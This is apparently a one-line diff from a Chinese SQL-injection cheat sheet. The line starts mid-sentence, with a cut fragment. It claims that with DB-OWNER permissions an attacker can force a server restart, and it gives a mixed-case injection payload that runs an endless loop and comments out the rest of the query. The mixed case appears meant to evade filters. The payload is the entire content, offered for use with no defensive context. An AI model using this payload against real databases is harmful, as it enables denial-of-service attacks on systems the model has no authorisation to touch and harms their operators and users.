@@ -1,0 +1,1 @@
+个DB-OWNER权限下让服务器重启    SQL命令:wHiLe 1<9 bEgIn sElEcT cHaR(0) eNd--
